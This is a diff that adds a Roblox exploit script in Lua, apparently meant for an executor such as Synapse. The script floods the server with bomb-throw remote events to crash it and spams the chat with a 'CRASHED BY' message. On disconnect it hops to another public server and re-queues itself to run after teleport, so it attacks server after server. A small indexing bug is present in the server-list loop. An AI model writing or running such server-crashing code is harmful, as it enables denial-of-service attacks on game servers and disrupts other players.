@@ -1,0 +1,59 @@
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+end
+
+function ChangeServer()
+    local t = {}
+    for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
+        if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
+            t[t + 1] = v.id 
+        end
+    end 
+    if #t > 0 then
+        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, t[math.random(1,#t)])
+    end
+end
+
+local EquipRemote = game:GetService("ReplicatedStorage"):WaitForChild("Events"):FindFirstChild("Backpack"):FindFirstChild("ToolEquipRE")
+local BombsRemote = game:GetService("ReplicatedStorage"):WaitForChild("Events"):FindFirstChild("Bomb"):FindFirstChild("ThrowBombRE")
+local ChatsRemote = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")
+local PromptOverlay = game:GetService("CoreGui"):WaitForChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
+
+EquipRemote:FireServer("Bomb")
+
+spawn(function()
+    while true do
+        ChatsRemote:FireServer("CRASHED BY Poo 69#5 3 5 0", "All")
+        wait()
+    end
+end)
+
+wait(3)
+
+spawn(function()
+    while true do
+        for i = 1, 25 do
+            BombsRemote:FireServer(Vector3.new(0,0,0),CFrame.new(0,0,0))
+        end
+        BombsRemote:FireServer(Vector3.new(0,0,0),CFrame.new(0,0,0))
+        task.wait()
+    end
+end)
+
+PromptOverlay.DescendantAdded:Connect(function(Child)
+    if Child.Name == "ErrorTitle" then
+        Child:GetPropertyChangedSignal("Text"):Connect(function()
+            if Child.Text:sub(0,12) == "Disconnected" then
+                ChangeServer()
+            end
+        end)
+    end
+end)
+
+game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
+    if State == Enum.TeleportState.Started then
+        syn.queue_on_teleport()
+    end
+end)
+
+
